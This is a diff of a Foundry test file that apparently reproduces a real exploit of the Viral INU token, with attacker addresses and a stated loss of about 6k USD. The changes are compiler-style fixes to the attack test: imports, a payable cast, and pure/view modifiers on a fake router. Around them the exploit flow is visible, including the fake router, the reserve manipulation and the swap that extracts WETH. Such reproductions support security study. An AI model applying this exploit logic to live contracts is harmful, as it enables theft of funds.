@@ -3,6 +3,10 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @KeyInfo - Total Lost : ~6k USD$
 // Attacker : https://etherscan.io/address/0x9748c8540a5f752ba747f1203ac13dae789033de
 // Attack Contract : https://etherscan.io/address/0xf73b8ea8838cba9148fb182e267a000f7cfba8dd
@@ -22,7 +26,7 @@ contract VinuTest is Test {
     // Viral INU token
     IVINU VINU = IVINU(0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IUniswapV2Router UniswapV2Router02 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Router UniswapV2Router02 = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     IUniswapV2Pair Pair = IUniswapV2Pair(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8);
     address private constant flashbotsAddress = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;
     Router FakeRouter;
@@ -60,7 +64,7 @@ contract VinuTest is Test {
         VINU.transfer(address(Pair), VINU.balanceOf(address(this)));
 
         (uint112 reserveWETH, uint112 reserveVINU,) = Pair.getReserves();
-        flashbotsAddress.call{value: 0.000000001 ether}("");
+        (bool success3,) = flashbotsAddress.call{value: 0.000000001 ether}("");
         uint256 amountOut = UniswapV2Router02.getAmountOut(amountIn, reserveVINU, reserveWETH);
 
         Pair.swap(amountOut, 0, address(this), "");
@@ -82,15 +86,15 @@ contract Router {
         return address(this);
     }
 
-    function WETH() external view returns (address) {
+    function WETH() external pure returns (address) {
         return wethAddr;
     }
 
-    function approve(address spender, uint256 amount) external returns (bool) {
+    function approve(address spender, uint256 amount) external pure returns (bool) {
         return true;
     }
 
-    function createPair(address tokenA, address tokenB) external returns (address) {
+    function createPair(address tokenA, address tokenB) external view returns (address) {
         return address(this);
     }
 
@@ -101,7 +105,7 @@ contract Router {
         uint256 amountETHMin,
         address to,
         uint256 deadline
-    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
+    ) external pure returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
         return (0, 0, 0);
     }
 
